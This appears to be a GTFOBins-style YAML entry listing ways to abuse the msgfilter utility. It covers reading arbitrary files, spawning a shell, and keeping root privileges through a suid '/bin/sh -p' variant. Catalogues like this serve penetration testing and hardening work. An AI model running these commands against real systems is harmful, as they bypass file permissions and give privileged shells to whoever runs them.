---
functions:
  file-read:
  - binary: false
    code: |-
      msgfilter -P -i /path/to/input-file /bin/cat
    comment: |-
      The file is parsed and displayed as a Java `.properties` file. `/bin/cat` can be replaced with any other *filter* program.
    contexts:
      sudo:
      suid:
      unprivileged:
  shell:
  - code: |-
      echo x | msgfilter -P /bin/sh -c '/bin/sh 0<&2 1>&2; kill $PPID'
    comment: |-
      The `kill` command is needed to spawn the shell only once. Instead of readinf from standard input, it can read files passed via the `-i` option.
    contexts:
      sudo:
      suid:
        code: |-
          echo x | msgfilter -P /bin/sh -p -c '/bin/sh -p 0<&2 1>&2; kill $PPID'
        shell: false
      unprivileged:
...
